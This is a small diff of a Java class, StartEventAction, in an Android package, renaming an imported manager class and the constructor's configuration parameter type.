@@ -2,15 +2,16 @@ package com.android.service.action;
 
 import org.json.JSONObject;
 
-import com.android.service.agent.AgentManager;
+import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.event.EventManager;
 import com.android.service.util.Check;
 
 public class StartEventAction extends EventAction {
 	private static final String TAG = "StartEventAction";
 
-	public StartEventAction(ActionConf params) {
+	public StartEventAction(ConfAction params) {
 		super( params);
 	}
 
